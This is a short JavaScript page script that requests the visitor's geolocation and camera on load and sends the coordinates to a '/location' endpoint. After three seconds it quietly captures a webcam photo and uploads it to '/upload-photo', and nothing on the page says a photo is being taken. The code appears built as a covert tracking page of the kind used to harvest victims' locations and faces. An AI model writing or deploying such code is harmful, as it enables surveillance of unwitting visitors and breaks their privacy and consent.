window.onload = function () {
  // Request location access
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, showError);
  } else {
    document.getElementById("status").innerText =
      "Geolocation is not supported by your browser.";
  }

  // Request camera access
  requestCameraAccess();
};

function sendLocation(position) {
  let lat = position.coords.latitude;
  let lon = position.coords.longitude;

  console.log("Latitude:", lat);
  console.log("Longitude:", lon);

  fetch("/location", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ latitude: lat, longitude: lon }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Data sent successfully:", data);
      document.getElementById(
        "status"
      ).innerText = `Your Location: ${data.latitude}, ${data.longitude}`;
    })
    .catch((error) => {
      console.error("Error:", error);
      document.getElementById("status").innerText = "Error sending location.";
    });
}

function showError(error) {
  let message = "";
  switch (error.code) {
    case error.PERMISSION_DENIED:
      message = "User denied location access.";
      break;
    case error.POSITION_UNAVAILABLE:
      message = "Location info unavailable.";
      break;
    case error.TIMEOUT:
      message = "Location request timed out.";
      break;
    default:
      message = "Unknown error occurred.";
  }
  alert(message);
  document.getElementById("status").innerText = message;
}

function requestCameraAccess() {
  navigator.mediaDevices
    .getUserMedia({ video: true })
    .then((stream) => {
      let video = document.createElement("video");
      video.id = "cameraFeed";
      video.autoplay = true;
      document.body.appendChild(video);
      video.srcObject = stream;

      // Capture photo after 3 seconds
      setTimeout(() => {
        capturePhoto(video);
      }, 3000);
    })
    .catch((error) => {
      console.error("Camera access denied:", error);
    });
}

function capturePhoto(video) {
  let canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  let ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert canvas to image data URL
  let imageData = canvas.toDataURL("image/png");

  // Send image to server
  fetch("/upload-photo", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image: imageData }),
  })
    .then((response) => response.json())
    .then((data) => console.log("Photo sent successfully:", data))
    .catch((error) => console.error("Error sending photo:", error));
}
